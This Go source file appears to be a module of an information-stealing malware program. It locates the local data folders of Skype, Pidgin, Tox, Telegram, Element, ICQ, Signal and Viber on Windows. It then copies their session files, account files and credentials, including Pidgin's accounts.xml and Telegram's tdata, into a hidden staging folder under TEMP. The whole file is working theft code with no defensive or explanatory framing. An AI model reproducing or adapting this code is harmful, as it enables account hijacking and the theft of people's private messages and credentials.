package socials

import (
	"io"
	"os"
	"path/filepath"
	"strings"
)

func Run() {
	folderMessaging := filepath.Join(os.Getenv("TEMP"), strings.ToLower(os.Getenv("USERNAME")), "SocialMedias")
	os.MkdirAll(folderMessaging, os.ModePerm)
	skypeStealer(folderMessaging)
	pidginStealer(folderMessaging)
	toxStealer(folderMessaging)
	telegramStealer(folderMessaging)
	elementStealer(folderMessaging)
	icqStealer(folderMessaging)
	signalStealer(folderMessaging)
	viberStealer(folderMessaging)
}

func skypeStealer(folderMessaging string) {
	skypeFolder := filepath.Join(os.Getenv("APPDATA"), "microsoft", "skype for desktop")
	if _, err := os.Stat(skypeFolder); os.IsNotExist(err) {
		return
	}
	skypeSession := filepath.Join(folderMessaging, "Skype")
	os.MkdirAll(skypeSession, os.ModePerm)
	copyDir(skypeFolder, skypeSession)
}

func pidginStealer(folderMessaging string) {
	pidginFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".purple")
	if _, err := os.Stat(pidginFolder); os.IsNotExist(err) {
		return
	}
	pidginAccounts := filepath.Join(folderMessaging, "Pidgin")
	os.MkdirAll(pidginAccounts, os.ModePerm)
	accountsFile := filepath.Join(pidginFolder, "accounts.xml")
	copyFile(accountsFile, filepath.Join(pidginAccounts, "accounts.xml"))
}

func toxStealer(folderMessaging string) {
	toxFolder := filepath.Join(os.Getenv("APPDATA"), "Tox")
	if _, err := os.Stat(toxFolder); os.IsNotExist(err) {
		return
	}
	toxSession := filepath.Join(folderMessaging, "Tox")
	os.MkdirAll(toxSession, os.ModePerm)
	copyDir(toxFolder, toxSession)
}

func telegramStealer(folderMessaging string) {
	pathtele := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Telegram Desktop", "tdata")
	if _, err := os.Stat(pathtele); os.IsNotExist(err) {
		return
	}

	telegramSession := filepath.Join(folderMessaging, "Telegram")
	os.MkdirAll(telegramSession, os.ModePerm)

	copyDirExclude(pathtele, telegramSession, []string{"user_data", "emoji"})
}

func elementStealer(folderMessaging string) {
	elementFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Element")
	if _, err := os.Stat(elementFolder); os.IsNotExist(err) {
		return
	}
	elementSession := filepath.Join(folderMessaging, "Element")
	os.MkdirAll(elementSession, os.ModePerm)
	copyDir(elementFolder, elementSession)
}

func icqStealer(folderMessaging string) {
	icqFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "ICQ")
	if _, err := os.Stat(icqFolder); os.IsNotExist(err) {
		return
	}
	icqSession := filepath.Join(folderMessaging, "ICQ")
	os.MkdirAll(icqSession, os.ModePerm)
	copyDir(icqFolder, icqSession)
}

func signalStealer(folderMessaging string) {
	signalFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Signal")
	if _, err := os.Stat(signalFolder); os.IsNotExist(err) {
		return
	}
	signalSession := filepath.Join(folderMessaging, "Signal")
	os.MkdirAll(signalSession, os.ModePerm)
	copyDir(signalFolder, signalSession)
}

func viberStealer(folderMessaging string) {
	viberFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "ViberPC")
	if _, err := os.Stat(viberFolder); os.IsNotExist(err) {
		return
	}
	viberSession := filepath.Join(folderMessaging, "Viber")
	os.MkdirAll(viberSession, os.ModePerm)
	copyDir(viberFolder, viberSession)
}


func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		targetPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(targetPath, info.Mode())
		} else {
			return copyFile(path, targetPath)
		}
	})
}

func copyDirExclude(srcDir, dstDir string, excludeDirs []string) error {
	return filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relativePath, _ := filepath.Rel(srcDir, path)
		for _, excludeDir := range excludeDirs {
			if strings.HasPrefix(relativePath, excludeDir) {
				if info.IsDir() {
					return filepath.SkipDir 
				}
				return nil
			}
		}

		dstPath := filepath.Join(dstDir, relativePath)

		if info.IsDir() {
			return os.MkdirAll(dstPath, os.ModePerm)
		}

		return copyFile(path, dstPath)
	})
}

func copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	_, err = io.Copy(dstFile, srcFile)
	return err
}